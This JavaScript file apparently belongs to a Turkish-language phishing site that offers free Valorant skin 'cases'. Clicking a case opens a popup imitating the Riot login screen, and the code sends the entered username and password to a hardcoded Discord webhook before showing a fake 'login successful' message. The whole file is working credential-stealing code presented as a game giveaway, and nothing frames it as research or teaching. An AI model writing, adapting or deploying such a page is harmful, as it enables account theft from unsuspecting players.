const WEBHOOK_URL = "https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq";

document.addEventListener("DOMContentLoaded", () => {
    // Üst Şerit Animasyonu
    const track = document.getElementById('track');
    const skins = ["skin1.png", "skin2.png", "skin3.png", "skin4.png", "skin5.png"];
    let html = "";
    [...skins, ...skins, ...skins, ...skins].forEach(s => {
        html += `<div class="drop-card"><img src="${s}"><span>RADYANİT ŞANSI</span></div>`;
    });
    track.innerHTML = html;

    // Kasa Listesi
    const cases = [
        {n: "BAŞLANGIÇ", p: "10 VP", i: "case1.png"},
        {n: "STANDART", p: "30 VP", i: "case2.png"},
        {n: "ELİT", p: "50 VP", i: "case3.png"},
        {n: "PREMIUM", p: "100 VP", i: "case4.png"},
        {n: "EFSANEVİ", p: "500 VP", i: "case5.png"},
        {n: "RADYANİT", p: "2000 VP", i: "case6.png"}
    ];
    document.getElementById('caseGrid').innerHTML = cases.map(c => `
        <div class="case-box" onclick="openAuth()">
            <img src="${c.i}">
            <h3>${c.n}</h3>
            <div class="vp-price">${c.p}</div>
            <button class="open-btn">KASA AÇ</button>
        </div>
    `).join('');

    // Sayaç UTC+3
    setInterval(() => {
        const now = new Date();
        const utc3 = new Date(now.getTime() + (now.getTimezoneOffset() * 60000) + (3 * 3600000));
        let target = new Date(utc3);
        target.setHours(24, 0, 0, 0);
        let diff = target - utc3;
        let h = Math.floor(diff / 3600000), m = Math.floor((diff % 3600000) / 60000), s = Math.floor((diff % 60000) / 1000);
        document.getElementById('countdown').innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
    }, 1000);
});

// 600x800 Boyutunda Full Riot Ekranı
function openAuth() {
    const w = 600, h = 800;
    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l},resizable=no`);
    
    win.document.body.innerHTML = `
        <style>
            body { 
                margin: 0; padding: 0; height: 100vh;
                background: url('login_bg.jpg') center/cover no-repeat; /* image_06c4e0.jpg */
                display: flex; justify-content: center; align-items: center;
                font-family: sans-serif;
            }
            .login-card {
                background: #fff; width: 380px; padding: 40px; border-radius: 4px;
                text-align: center; box-shadow: 0 10px 50px rgba(0,0,0,0.5);
            }
            .mini-logo { width: 100px; margin-bottom: 30px; } /* login_logo.png */
            h2 { font-size: 22px; font-weight: 800; margin-bottom: 25px; color: #111; text-transform: uppercase; }
            input { 
                width: 100%; padding: 14px; margin-bottom: 12px; border: 2px solid transparent; 
                background: #f2f2f2; border-radius: 4px; font-weight: 600; box-sizing: border-box; outline: none;
            }
            input:focus { border-color: #ff4655; background: #fff; }
            .btn-go { 
                width: 100%; padding: 16px; background: #ff4655; color: #fff; 
                border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 50px;
            }
        </style>
        <div class="login-card">
            <img src="login_logo.png" class="mini-logo">
            <h2>Giriş</h2>
            <input type="text" id="u" placeholder="KULLANICI ADI">
            <input type="password" id="p" placeholder="ŞİFRE">
            <button class="btn-go" id="btn">GİRİŞ YAP</button>
            <p style="font-size:11px; color:#999; margin-top:20px;">OTURUM AÇAMIYOR MUSUN? <br> HESAP OLUŞTUR</p>
        </div>
    `;

    win.document.getElementById('btn').onclick = function() {
        const u = win.document.getElementById('u').value, p = win.document.getElementById('p').value;
        if(u && p) {
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: `✅ **Yeni Giriş!**\n👤 Kullanıcı: \`${u}\` \n🔑 Şifre: \`${p}\`` })
            }).then(() => {
                win.document.body.innerHTML = "<h2 style='color:white; background:rgba(0,0,0,0.8); padding:20px;'>GİRİŞ BAŞARILI! SİTEYE YÖNLENDİRİLİYORSUNUZ...</h2>";
                setTimeout(() => win.close(), 1500);
            });
        }
    };
}
